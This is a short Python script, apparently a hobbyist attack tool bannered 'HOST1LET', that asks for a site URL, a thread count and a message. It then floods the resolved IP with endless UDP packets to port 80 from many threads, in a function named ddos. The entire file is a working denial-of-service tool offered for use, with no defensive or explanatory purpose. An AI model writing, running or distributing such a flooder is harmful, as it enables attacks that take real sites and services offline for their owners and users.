import time
import socket
import sys
import _thread
from colorama import Fore as f
import pyfiglet
from os import system
system("cls")

text="HOST1LET"

print('\033[31m'+pyfiglet.figlet_format(text,font='slant')+"\n"+'\033[34m'+"_"*60+'\033[00m')

print("")
site = input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter your site url {f.RED}=>{f.YELLOW} ")
thread_count = input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter your thread {f.RED}=>{f.YELLOW} ")
msg = str(input(f"{f.BLUE}[{f.RED}+{f.BLUE}] Enter Your Message Will Be Send To Your Target {f.RED}=>{f.YELLOW} "))
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = msg
print("")
print(f"{f.BLUE}UDP target IP {f.RED}>>> {f.YELLOW}{ip}")
print("")
print(f"{f.BLUE}UDP target port {f.RED}>>> {f.YELLOW}{UDP_PORT}")
print("")
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(f"{f.BLUE}Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
